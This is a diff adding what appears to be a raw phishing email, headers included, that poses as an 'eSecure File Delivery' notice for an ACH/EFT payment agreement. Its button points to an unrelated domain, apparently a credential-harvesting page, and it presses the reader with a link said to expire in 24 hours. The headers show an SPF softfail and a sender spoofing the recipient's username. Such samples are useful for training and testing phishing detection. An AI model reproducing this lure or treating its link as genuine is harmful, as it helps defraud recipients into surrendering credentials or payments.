@@ -1,0 +1,201 @@
+Return-Path: <zingerpie@edoc.net>
+Received: from edoc.net ([59.10.95.140])
+ by inbound-smtp.us-east-2.amazonaws.com with SMTP id 2q8g1esuj5kbod5rl5dmfuu2to7qk6u36vvm6n81
+ for zingerpie@kfcreview.com;
+ Fri, 12 Sep 2025 13:18:35 +0000 (UTC)
+Received-SPF: softfail (spfCheck: transitioning domain of edoc.net does not designate 59.10.95.140 as permitted sender) client-ip=59.10.95.140; envelope-from=zingerpie@edoc.net; helo=edoc.net;
+Authentication-Results: amazonses.com;
+ spf=softfail (spfCheck: transitioning domain of edoc.net does not designate 59.10.95.140 as permitted sender) client-ip=59.10.95.140; envelope-from=zingerpie@edoc.net; helo=edoc.net;
+ dmarc=none header.from=edoc.net;
+X-SES-RECEIPT: AEFBQUFBQUFBQUFHN2ZlMi8xcUxGUjlSN2hQdkUrcHFsMGEzb3oyK3VMUHpFMm91M1BRWjB3VTZpN3V0czdhSTdHSk1xdFl1a0VoMWFwbDNIVndJUXQxU24vZjl4b1NSakkxOUdDaUpEVFJ5RytsMjhpQWxGNkdlUDZ6QmxZS3dFQVh2bHRPZHZVM3RQeWRadXZMRjFKNzNVUDh2bU5UNUJGV2oza3VxUDIyOXRCcVYwaGk3L0FBT1NEekliSTc4cXFPNVRwZHRmTDdjcEFQQXV2TjZyVmhva010V0hXKzFmUGszNVZlclpwQ0ZoUWl1NEttYkdrQ2hEWDhOd09YTWYyZE5NUUN0NmN6Q0Rtd3FpVnBlZmNPZzBnQmNIZk91TEQ3OTNEbEw5dGtRY0gzMUUyZCt3Zmc9PQ==
+X-SES-DKIM-SIGNATURE: a=rsa-sha256; q=dns/txt; b=muXAhWxC/uTGZIaDk8CFtFSlBe3YGPBfQgXMQxmzTRqsMXKxvWsmMAF1mQV8gNwucpK3WLTeDhDhi6tGLnM8ENvSqpeMStH9rwpbmak6/a/mEwsKeb6udocxRn4QOd2R/LXuDT/vxcbEh/7YmpjG5CgXzcLsOrL6ZSaSC20y0HY=; c=relaxed/simple; s=ndjes4mrtuzus6qxu3frw3ubo3gpjndv; d=amazonses.com; t=1757683115; v=1; bh=LmD1e1TTLoC5WWwU7NBbYqUl23AIcaiC0UU/I28xA5k=; h=From:To:Cc:Bcc:Subject:Date:Message-ID:MIME-Version:Content-Type:X-SES-RECEIPT;
+From: eDocument Ready | Account Payable <zingerpie@edoc.net>
+To: zingerpie@kfcreview.com
+Subject: Completed: ACH/EFT_ Settlement_PaymentAgreement.
+Date: 12 Sep 2025 22:18:34 +0900
+Message-ID: <20250912221833.6A0CBDA4D00000A5@edoc.net>
+MIME-Version: 1.0
+Content-Type: text/html;
+	charset="iso-8859-1"
+Content-Transfer-Encoding: quoted-printable
+
+<HTML><HEAD>
+<META name=3DGENERATOR content=3D"MSHTML 11.00.10570.1001"></HEAD>
+<BODY>
+<DIV class=3Dlogo style=3D'BOX-SIZING: border-box; FONT-SIZE: 24px; FONT-FA=
+MILY: "Segoe UI", Tahoma, Geneva, Verdana, sans-serif; WHITE-SPACE: normal;=
+ WORD-SPACING: 0px; TEXT-TRANSFORM: none; FONT-WEIGHT: bold; COLOR: rgb(0,1=
+02,204); PADDING-BOTTOM: 0px; FONT-STYLE: normal; TEXT-ALIGN: center; PADDI=
+NG-TOP: 0px; PADDING-LEFT: 0px; ORPHANS: 2; WIDOWS: 2; MARGIN: 0px 0px 15px=
+; LETTER-SPACING: normal; PADDING-RIGHT: 0px; TEXT-INDENT: 0px; font-varian=
+t-ligatures: normal; font-variant-caps: normal;=20
+-webkit-text-stroke-width: 0px; text-decoration-thickness: initial; text-de=
+coration-style: initial; text-decoration-color: initial'>eSecure File Deliv=
+ery</DIV>
+<H1 style=3D'BOX-SIZING: border-box; FONT-SIZE: 28px; FONT-FAMILY: "Segoe U=
+I", Tahoma, Geneva, Verdana, sans-serif; WHITE-SPACE: normal; WORD-SPACING:=
+ 0px; BORDER-BOTTOM: rgb(234,234,234) 1px solid; TEXT-TRANSFORM: none; COLO=
+R: rgb(44,62,80); PADDING-BOTTOM: 15px; FONT-STYLE: normal; TEXT-ALIGN: cen=
+ter; PADDING-TOP: 0px; PADDING-LEFT: 0px; ORPHANS: 2; WIDOWS: 2; MARGIN: 0p=
+x 0px 25px; LETTER-SPACING: normal; PADDING-RIGHT: 0px; TEXT-INDENT: 0px; f=
+ont-variant-ligatures: normal; font-variant-caps:=20
+normal; -webkit-text-stroke-width: 0px; text-decoration-thickness: initial;=
+ text-decoration-style: initial; text-decoration-color: initial'>Secure Doc=
+ument for Review</H1>
+<DIV class=3Ddocument-info style=3D'BOX-SIZING: border-box; FONT-SIZE: 13px=
+; FONT-FAMILY: "Segoe UI", Tahoma, Geneva, Verdana, sans-serif; WHITE-SPACE=
+: normal; WORD-SPACING: 0px; TEXT-TRANSFORM: none; FONT-WEIGHT: 400; COLOR:=
+ rgb(51,51,51); PADDING-BOTTOM: 20px; FONT-STYLE: normal; PADDING-TOP: 20px=
+; PADDING-LEFT: 20px; BORDER-LEFT: rgb(0,102,204) 4px solid; ORPHANS: 2; WI=
+DOWS: 2; MARGIN: 0px 0px 25px; LETTER-SPACING: normal; PADDING-RIGHT: 20px;=
+ BACKGROUND-COLOR: rgb(249,249,249); TEXT-INDENT:=20
+0px; font-variant-ligatures: normal; font-variant-caps: normal; -webkit-tex=
+t-stroke-width: 0px; text-decoration-thickness: initial; text-decoration-st=
+yle: initial; text-decoration-color: initial; border-radius: 8px'>
+<P style=3D'BOX-SIZING: border-box; FONT-FAMILY: -apple-system, BlinkMacSys=
+temFont, "Helvetica Neue", "Segoe UI", Arial, sans-serif, "Apple Color Emoj=
+i", "Segoe UI Emoji", "Segoe UI Symbol"; PADDING-BOTTOM: 0px; PADDING-TOP: =
+0px; PADDING-LEFT: 0px; MARGIN: 0px 0px 10px; PADDING-RIGHT: 0px'><STRONG s=
+tyle=3D'BOX-SIZING: border-box; FONT-FAMILY: "Segoe UI", Tahoma, Geneva, Ve=
+rdana, sans-serif; PADDING-BOTTOM: 0px; PADDING-TOP: 0px; PADDING-LEFT: 0px=
+; MARGIN: 0px; PADDING-RIGHT: 0px'>
+You have been granted access to confidential Agreement documents:</STRONG><=
+/P>
+<P style=3D'BOX-SIZING: border-box; FONT-FAMILY: -apple-system, BlinkMacSys=
+temFont, "Helvetica Neue", "Segoe UI", Arial, sans-serif, "Apple Color Emoj=
+i", "Segoe UI Emoji", "Segoe UI Symbol"; PADDING-BOTTOM: 0px; PADDING-TOP: =
+0px; PADDING-LEFT: 0px; MARGIN: 0px 0px 10px; PADDING-RIGHT: 0px'>A secure =
+document has been shared with you for your review.</P>
+<P style=3D'BOX-SIZING: border-box; FONT-FAMILY: -apple-system, BlinkMacSys=
+temFont, "Helvetica Neue", "Segoe UI", Arial, sans-serif, "Apple Color Emoj=
+i", "Segoe UI Emoji", "Segoe UI Symbol"; PADDING-BOTTOM: 0px; PADDING-TOP: =
+0px; PADDING-LEFT: 0px; MARGIN: 0px 0px 10px; PADDING-RIGHT: 0px'><STRONG s=
+tyle=3D'BOX-SIZING: border-box; FONT-FAMILY: "Segoe UI", Tahoma, Geneva, Ve=
+rdana, sans-serif; PADDING-BOTTOM: 0px; PADDING-TOP: 0px; PADDING-LEFT: 0px=
+; MARGIN: 0px; PADDING-RIGHT: 0px'>Document:</STRONG>
+ <SPAN>&nbsp;ACH/EFT_</SPAN>Contract_Agreement_0035040_Pay<WBR style=3D'BOX=
+-SIZING: border-box; FONT-FAMILY: "Segoe UI", Tahoma, Geneva, Verdana, sans=
+-serif; PADDING-BOTTOM: 0px; PADDING-TOP: 0px; PADDING-LEFT: 0px; MARGIN: 0=
+px; PADDING-RIGHT: 0px'>ment_Schedule.pdf<WBR style=3D'BOX-SIZING: border-b=
+ox; FONT-FAMILY: "Segoe UI", Tahoma, Geneva, Verdana, sans-serif; PADDING-B=
+OTTOM: 0px; PADDING-TOP: 0px; PADDING-LEFT: 0px; MARGIN: 0px; PADDING-RIGHT=
+: 0px'></P>
+<P style=3D'BOX-SIZING: border-box; FONT-FAMILY: -apple-system, BlinkMacSys=
+temFont, "Helvetica Neue", "Segoe UI", Arial, sans-serif, "Apple Color Emoj=
+i", "Segoe UI Emoji", "Segoe UI Symbol"; PADDING-BOTTOM: 0px; PADDING-TOP: =
+0px; PADDING-LEFT: 0px; MARGIN: 0px 0px 10px; PADDING-RIGHT: 0px'><STRONG s=
+tyle=3D'BOX-SIZING: border-box; FONT-FAMILY: "Segoe UI", Tahoma, Geneva, Ve=
+rdana, sans-serif; PADDING-BOTTOM: 0px; PADDING-TOP: 0px; PADDING-LEFT: 0px=
+; MARGIN: 0px; PADDING-RIGHT: 0px'>
+Description:</STRONG><SPAN>&nbsp;Payment Agreement</SPAN>&nbsp;Review</P></=
+DIV>
+<DIV class=3Dbtn-container style=3D'BOX-SIZING: border-box; FONT-SIZE: 13px=
+; FONT-FAMILY: "Segoe UI", Tahoma, Geneva, Verdana, sans-serif; WHITE-SPACE=
+: normal; WORD-SPACING: 0px; TEXT-TRANSFORM: none; FONT-WEIGHT: 400; COLOR:=
+ rgb(51,51,51); PADDING-BOTTOM: 0px; FONT-STYLE: normal; TEXT-ALIGN: center=
+; PADDING-TOP: 0px; PADDING-LEFT: 0px; ORPHANS: 2; WIDOWS: 2; MARGIN: 30px =
+0px; LETTER-SPACING: normal; PADDING-RIGHT: 0px; TEXT-INDENT: 0px; font-var=
+iant-ligatures: normal; font-variant-caps: normal;=20
+-webkit-text-stroke-width: 0px; text-decoration-thickness: initial; text-de=
+coration-style: initial; text-decoration-color: initial'>
+&nbsp;<A class=3D"v1webfont v1cssbuttonpro" style=3D"BOX-SIZING: border-box=
+; TEXT-DECORATION: none; BORDER-TOP: medium none; BORDER-RIGHT: medium none=
+; WIDTH: 300px; WHITE-SPACE: normal; WORD-SPACING: 0px; MIN-WIDTH: 300px; B=
+ORDER-BOTTOM: medium none; TEXT-TRANSFORM: none; COLOR: rgb(255,255,255) !i=
+mportant; PADDING-BOTTOM: 0px; TEXT-ALIGN: center; PADDING-TOP: 0px; FONT: =
+bold 20px/48px arial, helvetica, sans-serif; PADDING-LEFT: 0px; BORDER-LEFT=
+: medium none; ORPHANS: 2; WIDOWS: 2; MARGIN: 0px;=20
+DISPLAY: inline-block; LETTER-SPACING: normal; PADDING-RIGHT: 0px; BACKGROU=
+ND-COLOR: rgb(37,95,130); TEXT-INDENT: 0px; -webkit-text-stroke-width: 0px;=
+ border-radius: 4px" href=3D"https://keys-tours.com/ms.html" rel=3Dnoopener=
+ target=3D_blank><STRONG style=3D'BOX-SIZING: border-box; FONT-FAMILY: "Seg=
+oe UI", Tahoma, Geneva, Verdana, sans-serif; FONT-WEIGHT: normal; COLOR: rg=
+b(255,255,255); PADDING-BOTTOM: 0px; PADDING-TOP: 0px; PADDING-LEFT: 0px; M=
+ARGIN: 0px; PADDING-RIGHT: 0px'>
+ &nbsp;<FONT style=3D'BOX-SIZING: border-box; FONT-FAMILY: "Segoe UI", Taho=
+ma, Geneva, Verdana, sans-serif; PADDING-BOTTOM: 0px; PADDING-TOP: 0px; PAD=
+DING-LEFT: 0px; MARGIN: 0px; PADDING-RIGHT: 0px' face=3DArial> eDocument Re=
+ady</FONT></STRONG></A><SPAN>&nbsp;</SPAN>
+ <SPAN style=3D'BOX-SIZING: border-box; FONT-SIZE: 13px; FONT-FAMILY: "Sego=
+e UI", Tahoma, Geneva, Verdana, sans-serif; WHITE-SPACE: normal; WORD-SPACI=
+NG: 0px; TEXT-TRANSFORM: none; FLOAT: none; FONT-WEIGHT: 400; COLOR: rgb(51=
+,51,51); PADDING-BOTTOM: 0px; FONT-STYLE: normal; TEXT-ALIGN: center; PADDI=
+NG-TOP: 0px; PADDING-LEFT: 0px; ORPHANS: 2; WIDOWS: 2; MARGIN: 0px; DISPLAY=
+: inline !important; LETTER-SPACING: normal; PADDING-RIGHT: 0px; BACKGROUND=
+-COLOR: rgb(255,255,255); TEXT-INDENT: 0px;=20
+font-variant-ligatures: normal; font-variant-caps: normal; -webkit-text-str=
+oke-width: 0px; text-decoration-thickness: initial; text-decoration-style: =
+initial; text-decoration-color: initial'>&nbsp;</SPAN>
+ <BR style=3D'BOX-SIZING: border-box; FONT-SIZE: 13px; FONT-FAMILY: "Segoe =
+UI", Tahoma, Geneva, Verdana, sans-serif; WHITE-SPACE: normal; WORD-SPACING=
+: 0px; TEXT-TRANSFORM: none; FONT-WEIGHT: 400; COLOR: rgb(51,51,51); PADDIN=
+G-BOTTOM: 0px; FONT-STYLE: normal; TEXT-ALIGN: center; PADDING-TOP: 0px; PA=
+DDING-LEFT: 0px; ORPHANS: 2; WIDOWS: 2; MARGIN: 0px; LETTER-SPACING: normal=
+; PADDING-RIGHT: 0px; BACKGROUND-COLOR: rgb(255,255,255); TEXT-INDENT: 0px;=
+ font-variant-ligatures: normal; font-variant-caps:=20
+normal; -webkit-text-stroke-width: 0px; text-decoration-thickness: initial;=
+ text-decoration-style: initial; text-decoration-color: initial'>
+<DIV style=3D'BOX-SIZING: border-box; FONT-SIZE: 13px; FONT-FAMILY: "Segoe =
+UI", Tahoma, Geneva, Verdana, sans-serif; WHITE-SPACE: normal; WORD-SPACING=
+: 0px; TEXT-TRANSFORM: none; FONT-WEIGHT: 400; COLOR: rgb(51,51,51); PADDIN=
+G-BOTTOM: 0px; FONT-STYLE: normal; TEXT-ALIGN: center; PADDING-TOP: 0px; PA=
+DDING-LEFT: 0px; ORPHANS: 2; WIDOWS: 2; MARGIN: 0px; LETTER-SPACING: normal=
+; PADDING-RIGHT: 0px; BACKGROUND-COLOR: rgb(255,255,255); TEXT-INDENT: 0px;=
+ font-variant-ligatures: normal; font-variant-caps:=20
+normal; -webkit-text-stroke-width: 0px; text-decoration-thickness: initial;=
+ text-decoration-style: initial; text-decoration-color: initial'>&nbsp;</DI=
+V></DIV>
+<DIV class=3Dnote style=3D'BOX-SIZING: border-box; FONT-SIZE: 13px; FONT-FA=
+MILY: "Segoe UI", Tahoma, Geneva, Verdana, sans-serif; WHITE-SPACE: normal;=
+ WORD-SPACING: 0px; TEXT-TRANSFORM: none; FONT-WEIGHT: 400; COLOR: rgb(51,5=
+1,51); PADDING-BOTTOM: 15px; FONT-STYLE: normal; PADDING-TOP: 15px; PADDING=
+-LEFT: 15px; BORDER-LEFT: rgb(255,204,0) 4px solid; ORPHANS: 2; WIDOWS: 2; =
+MARGIN: 0px 0px 25px; LETTER-SPACING: normal; PADDING-RIGHT: 15px; BACKGROU=
+ND-COLOR: rgb(255,249,230); TEXT-INDENT: 0px;=20
+font-variant-ligatures: normal; font-variant-caps: normal; -webkit-text-str=
+oke-width: 0px; text-decoration-thickness: initial; text-decoration-style: =
+initial; text-decoration-color: initial; border-radius: 8px'>
+<P style=3D'BOX-SIZING: border-box; FONT-FAMILY: -apple-system, BlinkMacSys=
+temFont, "Helvetica Neue", "Segoe UI", Arial, sans-serif, "Apple Color Emoj=
+i", "Segoe UI Emoji", "Segoe UI Symbol"; PADDING-BOTTOM: 0px; PADDING-TOP: =
+0px; PADDING-LEFT: 0px; MARGIN: 0px 0px 1em; PADDING-RIGHT: 0px'><STRONG st=
+yle=3D'BOX-SIZING: border-box; FONT-FAMILY: "Segoe UI", Tahoma, Geneva, Ver=
+dana, sans-serif; PADDING-BOTTOM: 0px; PADDING-TOP: 0px; PADDING-LEFT: 0px;=
+ MARGIN: 0px; PADDING-RIGHT: 0px'>Note:</STRONG><SPAN>
+ &nbsp;</SPAN>This link will expire in<SPAN>&nbsp;</SPAN><STRONG style=3D'B=
+OX-SIZING: border-box; FONT-FAMILY: "Segoe UI", Tahoma, Geneva, Verdana, sa=
+ns-serif; PADDING-BOTTOM: 0px; PADDING-TOP: 0px; PADDING-LEFT: 0px; MARGIN:=
+ 0px; PADDING-RIGHT: 0px'>24 hours</STRONG><SPAN>&nbsp;</SPAN>for security =
+reasons. Please review the document before then.</P></DIV>
+<DIV class=3Dconfidential style=3D'BOX-SIZING: border-box; FONT-SIZE: 14px;=
+ FONT-FAMILY: "Segoe UI", Tahoma, Geneva, Verdana, sans-serif; WHITE-SPACE:=
+ normal; WORD-SPACING: 0px; TEXT-TRANSFORM: none; FONT-WEIGHT: 400; COLOR: =
+rgb(51,51,51); PADDING-BOTTOM: 15px; FONT-STYLE: normal; PADDING-TOP: 15px;=
+ PADDING-LEFT: 15px; BORDER-LEFT: rgb(204,0,0) 4px solid; ORPHANS: 2; WIDOW=
+S: 2; MARGIN: 30px 0px 0px; LETTER-SPACING: normal; PADDING-RIGHT: 15px; BA=
+CKGROUND-COLOR: rgb(255,230,230); TEXT-INDENT: 0px;=20
+font-variant-ligatures: normal; font-variant-caps: normal; -webkit-text-str=
+oke-width: 0px; text-decoration-thickness: initial; text-decoration-style: =
+initial; text-decoration-color: initial; border-radius: 8px'>
+<P style=3D'BOX-SIZING: border-box; FONT-FAMILY: -apple-system, BlinkMacSys=
+temFont, "Helvetica Neue", "Segoe UI", Arial, sans-serif, "Apple Color Emoj=
+i", "Segoe UI Emoji", "Segoe UI Symbol"; PADDING-BOTTOM: 0px; PADDING-TOP: =
+0px; PADDING-LEFT: 0px; MARGIN: 0px 0px 1em; PADDING-RIGHT: 0px'><STRONG st=
+yle=3D'BOX-SIZING: border-box; FONT-FAMILY: "Segoe UI", Tahoma, Geneva, Ver=
+dana, sans-serif; PADDING-BOTTOM: 0px; PADDING-TOP: 0px; PADDING-LEFT: 0px;=
+ MARGIN: 0px; PADDING-RIGHT: 0px'>
+CONFIDENTIAL:</STRONG><SPAN>&nbsp;</SPAN>This message contains confidential=
+ information and is intended only for the individual named. If you are not =
+the named addressee, you should not disseminate, distribute or copy this em=
+ail. Please notify the sender immediately if you have received this email b=
+y mistake and delete this email from your system.</P></DIV>
+<P style=3D'BOX-SIZING: border-box; FONT-SIZE: 13px; FONT-FAMILY: -apple-sy=
+stem, BlinkMacSystemFont, "Helvetica Neue", "Segoe UI", Arial, sans-serif, =
+"Apple Color Emoji", "Segoe UI Emoji", "Segoe UI Symbol"; WHITE-SPACE: norm=
+al; WORD-SPACING: 0px; TEXT-TRANSFORM: none; FONT-WEIGHT: 400; COLOR: rgb(5=
+1,51,51); PADDING-BOTTOM: 0px; FONT-STYLE: normal; PADDING-TOP: 0px; PADDIN=
+G-LEFT: 0px; ORPHANS: 2; WIDOWS: 2; MARGIN: 0px 0px 1em; LETTER-SPACING: no=
+rmal; PADDING-RIGHT: 0px; TEXT-INDENT: 0px;=20
+font-variant-ligatures: normal; font-variant-caps: normal; -webkit-text-str=
+oke-width: 0px; text-decoration-thickness: initial; text-decoration-style: =
+initial; text-decoration-color: initial'>&nbsp;</P></BODY></HTML>
